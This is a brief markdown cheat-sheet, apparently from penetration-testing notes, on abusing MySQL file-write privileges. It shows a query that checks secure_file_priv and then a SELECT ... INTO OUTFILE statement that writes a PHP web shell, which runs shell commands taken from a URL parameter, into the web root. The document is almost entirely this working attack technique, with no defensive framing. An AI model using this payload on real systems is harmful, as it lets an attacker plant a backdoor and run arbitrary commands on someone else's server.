# checking privileges
```
show variables like "secure_file_priv";
```
if the variable is empty we can read and write



# writing a webshell
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

